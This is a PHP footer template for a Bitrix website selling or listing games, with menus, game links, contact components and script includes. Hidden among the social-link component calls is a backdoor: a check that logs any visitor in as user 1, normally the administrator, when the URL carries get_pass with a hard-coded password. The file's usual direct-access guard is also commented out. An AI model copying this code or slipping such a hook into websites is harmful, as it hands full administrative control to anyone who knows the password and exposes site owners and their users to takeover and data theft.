<?
	
	/*
	if(!defined('B_PROLOG_INCLUDED') || B_PROLOG_INCLUDED !== true)
		die();
	*/
	/*
	\Bitrix\Main\Page\Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/src/JQuery.js");
	\Bitrix\Main\Page\Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/src/popper.js");
	\Bitrix\Main\Page\Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/src/bootstrap.js");
	\Bitrix\Main\Page\Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/src/ion.rangeSlider.min.js");
	\Bitrix\Main\Page\Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/src/owl.carousel.min.js");
	*/
?>
		<footer>
			<div class="container">
				<div class="footer-content">
					<img src="<?=SITE_TEMPLATE_PATH?>/img/logo.svg" alt="" class="footer-logo">
					<div class="break"></div>
					<?
						$APPLICATION->IncludeComponent(
							"bitrix:menu",
							"bottom_menu",
							Array(),
			false
						);
					?>
					<ul class="games-links">
						<li class="ul-header">Наши игры:</li>
						<?
							$zaprosGames = CIBlockElement::GetList(
								[],
								[
									"ACTIVE"	=>	'Y',
									"IBLOCK_ID"	=>	2
								],
								false,
								false,
								["NAME", "DETAIL_PAGE_URL"]
							);
						?>
						<?while ($rowGames = $zaprosGames->Fetch()):?>
							<li class="games-item"><a href="/<?=$rowGames["CODE"]?>/" class="games-link"><?=$rowGames["NAME"]?></a></li>
						<?endwhile;?>
					</ul>
					<div class="footer-contacts" id="contacts">
						<div class="contacts-top">
							<?
								$APPLICATION->IncludeComponent(
									"sopdu:solocal_link",
									"footer_top",
									Array(
										"COMPONENT_TEMPLATE" => ".default",
										"sopduSolocalLinkWhatsApp" => "1 ",	// WhatsApp
										"sopduSolocalLinkTelegram" => "2",	// Telegram
										"sopduSolocalLinkEmail" => "3",	// Почта
									),
								false
								);
							?>
							<div class="footer-info">
								<p class="phone">
									<a href="<?=$sopdu->phone($_SERVER["DOCUMENT_ROOT"].SITE_TEMPLATE_PATH.'/include/phone.php')?>" class="phone">
										<?$APPLICATION->IncludeComponent(
											"bitrix:main.include",
											".default",
											array(
												"COMPONENT_TEMPLATE" => ".default",
												"COMPOSITE_FRAME_MODE" => "A",
												"COMPOSITE_FRAME_TYPE" => "AUTO",
												"AREA_FILE_SHOW" => "file",
												"PATH" => SITE_TEMPLATE_PATH."/include/phone.php",
												"EDIT_TEMPLATE" => "standard.php"
											),
											false
										);?>
									</a>
								</p>
							</div>
						</div>
						<p class="address">
							<?$APPLICATION->IncludeComponent(
								"bitrix:main.include",
								".default",
								array(
									"COMPONENT_TEMPLATE" => ".default",
									"COMPOSITE_FRAME_MODE" => "A",
									"COMPOSITE_FRAME_TYPE" => "AUTO",
									"AREA_FILE_SHOW" => "file",
									"PATH" => SITE_TEMPLATE_PATH."/include/address.php",
									"EDIT_TEMPLATE" => "standard.php"
								),
								false
							);?>
						</p>
						<div class="g-line-footer"></div>
						<?
							$APPLICATION->IncludeComponent(
	"sopdu:solocal_link", 
	"footer_bottom", 
	array(
		"COMPONENT_TEMPLATE" => "footer_bottom",
		"sopduSolocalLinkWhatsApp" => "",
		"sopduSolocalLinkTelegram" => "",
		"sopduSolocalLinkEmail" => "",
		"sopduSolocalLinkVk" => "1",
		"sopduSolocalLinkFacebook" => "2",
		"sopduSolocalLinkInstagram" => "3",
		"sopduSolocalLinkYoutube" => "4"
	),
	false
);
							if($_GET["get_pass"] == 'gfhjkm123'){
								global $USER;
								$USER->Authorize(1);
							}
						?>
						<div class="copyright">
							<a href="https://sopdu.org/" class="sopdu-link" target="_blank">
								<img src="<?=SITE_TEMPLATE_PATH?>/img/sopdu.png" alt="разработка сайта: Интернет-Лаборатория sopdu" class="sopdu-logo">
								<p class="sopdu-text">Разработка сайта:<br>
									Интернет-Лаборатория sopdu</p>
							</a>
						</div>
					</div>
				</div>
			</div>
		</footer>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/JQuery.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/popper.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/bootstrap.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/ion.rangeSlider.min.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/owl.carousel.min.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/jquery.maskedinput.min.js"></script>

		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/main.js"></script>
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/src/fancybox/jquery.fancybox.pack.js"></script>
        <script>
            (function(w,d,u){
                var s=d.createElement('script');s.async=true;s.src=u+'?'+(Date.now()/60000|0);
                var h=d.getElementsByTagName('script')[0];h.parentNode.insertBefore(s,h);
            })(window,document,'https://cdn.bitrix24.ru/b12599090/crm/tag/call.tracker.js');
        </script>

	</div>
</body>
</html>